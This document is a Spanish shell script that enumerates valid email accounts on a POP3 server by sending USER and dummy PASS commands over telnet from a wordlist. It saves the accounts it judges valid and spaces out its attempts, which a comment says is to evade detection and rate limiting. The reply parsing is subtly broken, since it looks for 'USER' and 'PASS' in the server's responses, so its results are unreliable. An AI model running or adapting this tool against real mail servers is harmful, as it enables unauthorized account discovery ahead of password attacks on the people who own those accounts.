#!/bin/sh
# enumeración POP3 de usuarios usando telnet 
# diccionario cuentas.txt donde tendremos las cuentas de email a probar
# @antonio_taboada

TARGET="pop3.dominio.com"
PORT=110
USERFILE="cuentas.txt"
TIMEOUT=9
DELAY=3

# Funciones auxiliares
log() {
    echo "[$(date '+%H:%M:%S')] $1" >> pop3_enum.log
}

test_pop3_user() {
    local user="$1"
    local response=""

    # Conectar y enviar comandos POP3
    response=$( (
        sleep 1
        echo "USER $user"
        sleep 1
        echo "PASS test_password_12345"
        sleep 1
        echo "QUIT"
    ) | timeout "$TIMEOUT" telnet "$TARGET" "$PORT" 2>/dev/null | grep -E "^(\\+OK|-ERR)" | head -2 )

    echo "$response"
}

# Verificar pre-conexión
echo "Verificando conectividad con $TARGET:$PORT..."
if ! nc -zv "$TARGET" "$PORT" 2>/dev/null; then
    echo "ERROR: No se puede conectar a $TARGET:$PORT"
    exit 1
fi

# Obtener banner del servidor
banner=$(echo "QUIT" | timeout 3 telnet "$TARGET" "$PORT" 2>/dev/null | head -1)
echo "Banner del servidor: $banner"
log "Banner: $banner"

echo ""
echo "Iniciando enumeración de usuarios..."
echo "=================================="

# Contadores
total=0
valid=0
invalid=0

while IFS= read -r username; do
    # Limpiar username
    username=$(echo "$username" | tr -d '\r\n\t' | xargs)
    [ -z "$username" ] && continue

    total=$((total + 1))
    printf "[%d/%d] %-35s " $total $total "$username"

    # Probar usuario
    response=$(test_pop3_user "$username")

    # Analizar respuesta POP3 según RFC 1939
    # +OK = Comando exitoso
    # -ERR = Error

    user_response=$(echo "$response" | grep -i "USER" | head -1)
    pass_response=$(echo "$response" | grep -i "PASS" | head -1)

    # Caso 1: Usuario valido (el servidor acepta USER y pide password)
    if echo "$user_response" | grep -q "^+OK"; then
        echo "-> Existe cuenta! - solicita ingresar la clave !!!"
        echo "$username" >> valid_users.txt
        log "Existe cuenta!: $username"
        valid=$((valid + 1))

    # Caso 2: Usuario inválido (el servidor rechaza USER)
    elif echo "$user_response" | grep -qi "^\-ERR.*invalid\|^\-ERR.*unknown\|^\-ERR.*not found"; then
        echo "-- cuenta no existe. "
        invalid=$((invalid + 1))
        log "invalido: $username"

    # Caso 3: Error genérico pero con -ERR
    elif echo "$user_response" | grep -q "^-ERR"; then
        echo "✗ RECHAZADO (error: $(echo "$user_response" | cut -d' ' -f2-))"
        invalid=$((invalid + 1))

    # Caso 4: Sin respuesta o timeout
    elif [ -z "$user_response" ]; then
        echo "- sin respuesta, error !!!"
        echo "$username" >> timeout_users.txt
        log "TIMEOUT: $username"

    else
        echo "? RESPUESTA INESPERADA: $user_response"
        echo "$username" >> unexpected_users.txt
        log "INESPERADO: $username - $user_response"
    fi

    # Delay para evitar detección/rate limiting
    sleep "$DELAY"

done < "$USERFILE"

# Resumen final
echo ""
echo "=========================================="
echo "RESUMEN DE ENUMERACIÓN POP3"
echo "=========================================="
echo "Total usuarios probados: $total"
echo "Cuentas válidas: $valid"
echo "Cuentas inválidas: $invalid"
echo ""
echo "Archivos generados:"
[ -f valid_users.txt ] && echo "  - valid_users.txt ($valid cuentas válidas)"
[ -f timeout_users.txt ] && echo "  - timeout_users.txt (posibles timeouts)"
[ -f pop3_enum.log ] && echo "  - pop3_enum.log (log detallado)"
echo "=========================================="

# Mostrar primeras cuentas válidas encontradas
if [ -f valid_users.txt ] && [ $valid -gt 0 ]; then
    echo ""
    echo "Cuentas válidas encontradas:"
    head -10 valid_users.txt | while read -r user; do
        echo "  - $user"
    done
    [ $valid -gt 10 ] && echo "  ... y $(($valid - 10)) más"
fi


